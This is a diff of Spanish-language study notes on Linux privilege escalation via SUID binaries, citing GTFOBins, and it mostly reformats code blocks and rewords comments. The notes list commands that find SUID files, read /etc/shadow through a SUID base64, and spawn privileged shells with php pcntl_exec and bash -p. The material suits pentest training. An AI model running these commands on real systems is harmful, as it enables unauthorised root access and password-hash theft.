@@ -14,7 +14,6 @@ Una vez más, se os comparte el mismo recurso que en la clase anterior, dado que
 
 - **GTFOBins**: [https://gtfobins.github.io](https://gtfobins.github.io/)
 
-
 ## SUID
 
 En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
@@ -26,19 +25,22 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 ❯ find / -perm -4000 -ls 2>/dev/null              # Para ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
 ❯ find / -perm -u=s -type f 2>/dev/null           # Buscar comandos SUID desde la raiz 
 ❯ find \-user <username> 2>/dev/null              # Para ver que comandos donde el propiertario es es usuario
+```
 
-# Podemos encontrar comandos asi:
+```bash 
+# Se puede encontrar comandos de este tipo:
 -rwsr-xr-x 1 root root 8756 Feb 7 2022 /usr/bin/base64
 -rwsr-xr-x 1 root root 8756 Feb 9 2022 /usr/bin/php8.1
 
-# Podremos ejecutar el comando si es SUID como el propietario de forma temporal sin passwd
+# Ejecutar el comando si es SUID como el propietario de forma temporal y sin passwd
 ❯ base64 /etc/shadow | base64 -d                  # Podriamos ver el /etc/shadow
 
-❯ php -r "pcntl_exec('/bin/sh', ['-p']);"         # Podemos obtener una consola interactiva
-❯ bash -p                                         # Obtener la consola bash, p = privilege
+❯ php -r "pcntl_exec('/bin/sh', ['-p']);"     # Obtener una consola interactiva
+❯ bash -p                                     # Obtener la consola bash, p = privilege
 
-# Podemos ejecutar como 
-❯ sudo /home/file.sh                               # Esto si el usuario a ejecutar el binario es 'root'  
-❯ sudo -u <user> /home/file.sh                     # Esto si tenemos el usuario el cual al ejecutar el binario no necesite permisos 
+# Podemos ejecutar como root
+❯ sudo /home/file.sh 
+
+❯ sudo -u <user> /home/file.sh    # Si el usuario no necesite permisos para ejecutar el binario
 ```
 
